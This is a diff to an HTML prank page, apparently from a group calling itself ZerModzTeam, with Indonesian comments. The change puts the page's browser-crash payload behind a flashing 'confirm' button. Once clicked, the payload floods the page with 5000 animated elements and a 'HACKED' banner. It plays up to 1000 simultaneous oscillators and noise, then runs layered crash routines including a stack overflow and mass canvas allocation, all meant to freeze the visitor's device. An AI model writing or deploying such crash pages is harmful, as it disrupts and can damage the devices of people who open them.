@@ -3,15 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ZerModz Ultimate Crash</title>
+    <title>ZerModz Warning</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             background: black;
-            overflow: hidden;
-            width: 100vw;
+            color: white;
+            font-family: 'Courier New', monospace;
             height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        #warning-container {
+            text-align: center;
+            z-index: 10000;
+        }
+        #warning-text {
+            font-size: 3rem;
+            font-weight: bold;
+            color: red;
+            text-shadow: 0 0 30px red, 0 0 60px yellow;
+            animation: warning-blink 0.5s infinite;
+            margin-bottom: 50px;
+            padding: 20px;
+            border: 5px solid red;
+            border-radius: 20px;
+            background: rgba(0,0,0,0.8);
+        }
+        @keyframes warning-blink {
+            0% { opacity: 1; text-shadow: 0 0 30px red; }
+            50% { opacity: 0.5; text-shadow: 0 0 60px yellow; }
+            100% { opacity: 1; text-shadow: 0 0 30px red; }
+        }
+        #confirm-btn {
+            font-size: 2.5rem;
+            padding: 20px 60px;
+            background: linear-gradient(45deg, red, darkred);
+            color: white;
+            border: 3px solid white;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 50px red;
+            animation: btn-pulse 1s infinite;
+        }
+        @keyframes btn-pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        #crash-content {
+            display: none;
+            width: 100%;
+            height: 100%;
             position: relative;
         }
         .floating-text {
@@ -62,10 +109,22 @@
     </style>
 </head>
 <body>
-    <div id="main-text">HACKED BY ZerModzTeam</div>
+    <div id="warning-container">
+        <div id="warning-text">⚠️ YAKIN MAU CLICK? NANTI RUSAK LOH!! ⚠️</div>
+        <div id="confirm-btn">GAS KEUN 🔥</div>
+    </div>
+
+    <div id="crash-content"></div>
 
     <script>
-        (function() {
+        document.getElementById('confirm-btn').addEventListener('click', function() {
+            // Hilangkan warning
+            document.getElementById('warning-container').style.display = 'none';
+            
+            // Tampilkan konten crash
+            const crashDiv = document.getElementById('crash-content');
+            crashDiv.style.display = 'block';
+            
             // ========== 1. 5000 TEKS BERHAMBURAN ==========
             for (let i = 0; i < 5000; i++) {
                 const div = document.createElement('div');
@@ -79,16 +138,21 @@
                 div.style.animationDuration = (0.2 + Math.random() * 0.8) + 's';
                 div.style.transform = 'rotate(' + (Math.random() * 360) + 'deg)';
                 div.style.opacity = 0.7 + Math.random() * 0.3;
-                document.body.appendChild(div);
+                crashDiv.appendChild(div);
             }
 
-            // ========== 2. 1000 SUARA BERSAMAAN ==========
+            // ========== 2. TEKS UTAMA ==========
+            const mainText = document.createElement('div');
+            mainText.id = 'main-text';
+            mainText.textContent = 'HACKED BY ZerModzTeam';
+            crashDiv.appendChild(mainText);
+
+            // ========== 3. 1000 SUARA BERSAMAAN ==========
             (function spawn1000Sounds() {
                 try {
                     const AudioContext = window.AudioContext || window.webkitAudioContext;
                     if (!AudioContext) return;
 
-                    // Bikin 50 AudioContext, masing-masing 20 oscillator = 1000
                     for (let ctxIndex = 0; ctxIndex < 50; ctxIndex++) {
                         setTimeout(() => {
                             try {
@@ -98,7 +162,7 @@
                                 compressor.ratio.setValueAtTime(20, audioCtx.currentTime);
 
                                 const masterGain = audioCtx.createGain();
-                                masterGain.gain.value = 0.05; // kecil biar gk sakit
+                                masterGain.gain.value = 0.05;
 
                                 compressor.connect(masterGain);
                                 masterGain.connect(audioCtx.destination);
@@ -120,7 +184,6 @@
                                     osc.stop(audioCtx.currentTime + 10);
                                 }
 
-                                // White noise per context
                                 const bufferSize = 4096;
                                 const noiseNode = audioCtx.createScriptProcessor(bufferSize, 1, 1);
                                 noiseNode.onaudioprocess = function(e) {
@@ -140,7 +203,7 @@
                 } catch(e) {}
             })();
 
-            // ========== 3. CRASH EXTREME 15 LAPIS ==========
+            // ========== 4. CRASH EXTREME ==========
             function ultimateCrash() {
                 // LAPIS 1: Stack overflow
                 (function stack() {
@@ -199,7 +262,7 @@
                                 ctx.fillRect(Math.random()*4000, Math.random()*4000, 200, 200);
                             }
                         }
-                        document.body.appendChild(canvas);
+                        crashDiv.appendChild(canvas);
                     }
                 } catch(e) {}
 
@@ -225,9 +288,9 @@
                 }
             }
 
-            // Mulai crash setelah 2 detik (biar teks dan sound sempat kebaca)
+            // Mulai crash setelah 2 detik biar teks dan sound sempat jalan
             setTimeout(ultimateCrash, 2000);
-        })();
+        });
     </script>
 </body>
 </html>
